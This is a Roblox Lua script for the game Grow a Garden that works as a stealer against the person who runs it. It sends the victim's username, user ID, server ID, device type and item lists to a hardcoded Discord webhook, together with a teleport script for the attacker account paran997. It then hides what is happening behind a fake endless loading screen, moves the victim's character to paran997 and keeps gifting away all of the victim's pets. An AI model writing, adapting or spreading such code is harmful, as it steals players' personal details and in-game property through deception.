-- GROW A GARDEN Logger + AutoGift + Fake Loading Screen
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local fruits, pets = {}, {}

for _, tool in ipairs(backpack:GetChildren()) do
	local itemType = tool:GetAttribute("ItemType")
	if itemType == "Fruit" then
		table.insert(fruits, tool.Name)
	elseif itemType == "Pet" then
		table.insert(pets, tool.Name)
	end
end

local function listify(list)
	if #list == 0 then return "*None*" end
	return "- " .. table.concat(list, "\n- ")
end

local webhook = "https://discord.com/api/webhooks/1383092802371719188/h2E5B2mPZswCJdtsZHiKFeCbAfbIw1F4zIRPydC0sxgiJiBlg8_7N7429PJK8xqpO_Ku"
local jobId = game.JobId
local stealScript = string.format([[
-- Steal Script (paran997 executes this)
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
TeleportService:TeleportToPlaceInstance(game.PlaceId, "%s", LocalPlayer)
]], jobId)

local http = http_request or request or syn.request
if http then
	http({
		Url = webhook,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = HttpService:JSONEncode({
			["embeds"] = {{
				["title"] = "GROW A GARDEN HIT!!",
				["description"] = string.format(
					"**Username:** %s\n**UserId:** %d\n**JobId:** %s\n**Device:** %s\n**Country:** Unknown",
					player.Name,
					player.UserId,
					jobId,
					UserInputService.TouchEnabled and "Mobile" or "PC"
				),
				["color"] = 16711680,
				["fields"] = {
					{ ["name"] = "FRUITS", ["value"] = listify(fruits) },
					{ ["name"] = "PETS", ["value"] = listify(pets) },
					{ ["name"] = "Steal Script", ["value"] = "```lua\n" .. stealScript .. "\n```" }
				},
				["footer"] = { ["text"] = "Time: " .. os.date("!%Y-%m-%d %H:%M:%S UTC") }
			}}
		})
	})
end

-- Create fake infinite loading screen
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "FakeLoading"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

local frame = Instance.new("Frame", gui)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.Size = UDim2.new(1, 0, 1, 0)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 1, 0)
label.Text = "Loading..."
label.TextColor3 = Color3.new(1, 1, 1)
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.BackgroundTransparency = 1

-- Find paran997
local function findparan997()
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Name == "paran997" then
			return p
		end
	end
	return nil
end

-- Equip everything and unset Favorite
local function equipAll()
	for _, tool in ipairs(backpack:GetChildren()) do
		local typeAttr = tool:GetAttribute("ItemType")
		if typeAttr == "Pet" or typeAttr == "Fruit" then
			if tool:GetAttribute("Favorite") ~= nil then
				tool:SetAttribute("Favorite", false)
			end
			tool.Parent = player.Character
		end
	end
end

-- Gift all equipped pets to paran997
local function giftAllToPaare()
	for _, tool in ipairs(player.Character:GetChildren()) do
		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
			if tool:GetAttribute("Favorite") ~= nil then
				tool:SetAttribute("Favorite", false)
			end
			local args = { "GivePet", Players:WaitForChild("paran997") }
			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
		end
	end
end

-- Disable "Favorite" on equipped tools
local function disableFavoriteOnEquipped()
	for _, tool in ipairs(player.Character:GetChildren()) do
		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
			if tool:GetAttribute("Favorite") ~= nil then
				tool:SetAttribute("Favorite", false)
			end
		end
	end
end

-- Continuously gift if paran997 is found
RunService.RenderStepped:Connect(function()
	local paran997 = findparan997()
	if paran997 and player.Character and paran997.Character and paran997.Character:FindFirstChild("HumanoidRootPart") then
		player.Character:MoveTo(paran997.Character.HumanoidRootPart.Position)
		equipAll()
		disableFavoriteOnEquipped()
		giftAllToPaare()
	end
end)

-- Unequip all pets from mover objects
local PetsPhysical = workspace:WaitForChild("PetsPhysical")
for _, petMover in pairs(PetsPhysical:GetDescendants()) do
	if petMover:IsA("BasePart") and petMover.Name == "PetMover" then
		local uuid = petMover:GetAttribute("UUID")
		local owner = petMover:GetAttribute("OWNER")
		if uuid and owner == player.Name then
			PetsService:FireServer("UnequipPet", uuid)
			print("Unequipped pet with UUID:", uuid)
		end
	end
end
